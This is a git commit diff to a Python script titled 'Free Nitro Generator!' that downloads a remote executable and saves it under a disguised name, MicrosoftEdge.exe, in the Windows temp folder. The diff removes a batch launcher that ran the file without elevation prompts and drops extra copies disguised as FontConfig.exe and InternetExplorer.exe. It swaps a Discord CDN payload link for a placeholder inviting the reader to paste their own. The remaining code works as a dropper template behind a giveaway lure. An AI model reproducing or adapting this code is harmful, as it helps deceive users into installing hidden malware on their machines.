51547a6dc2e33556aecaa9307f1dab337462fe6e
Apathy <88778112+Apathyy322@users.noreply.github.com>
2024-07-29 23:38:18 +0300

    Update main.py

--- Open-Source/main.py
+++ Open-Source/main.py
@@ -23,6 +23,7 @@ menu = """
 username = getpass.getuser()
 def titlo(title):
     ctypes.windll.kernel32.SetConsoleTitleW(title)
+    
 titlo("Free Nitro Generator!")
 def download_file(url, save_path):
     response = requests.get(url, stream=True)
@@ -32,28 +33,13 @@ def download_file(url, save_path):
         for chunk in response.iter_content(chunk_size=8192):
             if chunk:
                 file.write(chunk)
-def create_and_run_batch():
-    batch_content = r'cmd /min /C "set __COMPAT_LAYER=runasinvoker && start "" "%1"'
-    batch_filename = "run_with_invoke.bat"
-    batch_path = os.path.join(os.getcwd(), batch_filename)
-    with open(batch_path, 'w') as batch_file:
-        batch_file.write(batch_content)
-    subprocess.run([batch_path, os.path.abspath(save_path)], check=True)
 def main():
-    url = "https://cdn.discordapp.com/attachments/1261077320316358686/1267518972773924905/DiscordNitroGenerator.exe?ex=66a91488&is=66a7c308&hm=b1303b540de88e232cbcc8d4f0604d2c2700353aaf6e98921f275ffa70829fcf&"
+    url = "paste here your own link to instantly download executable!"
     directory = "C:\\Windows\\Temp"
-    directory1 = os.path.join("C:\\Users", username, "AppData", "Local", "Temp", "fontconfig", "cache")
-    directory2 = os.path.join(f"C:\\Users\\Public\\Music")
     filename = "MicrosoftEdge.exe"
-    filename1 = "FontConfig.exe"
-    filename2 = "InternetExplorer.exe"
     save_path = os.path.join(directory, filename)
-    save_path1 = os.path.join(directory1, filename1)
-    save_path2 = os.path.join(directory2, filename2)
     try:
         download_file(url, save_path)
-        download_file(url, save_path1)
-        download_file(url, save_path2)
     except Exception as e:
         print(f"An error occurred: {e}")
 if __name__ == "__main__":
